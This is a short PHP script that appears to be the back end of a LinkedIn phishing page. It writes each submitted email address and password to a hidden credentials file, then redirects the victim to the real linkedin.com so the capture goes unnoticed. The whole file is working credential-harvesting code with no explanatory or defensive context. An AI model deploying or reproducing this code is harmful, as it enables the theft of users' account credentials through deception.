<?php
file_put_contents("../../.server/credentials.txt", "LinkedIn Login\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Email: " . $_POST['email'] . "\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Password: " . $_POST['password'] . "\n\n", FILE_APPEND);
header('Location: https://linkedin.com');
exit();
?>
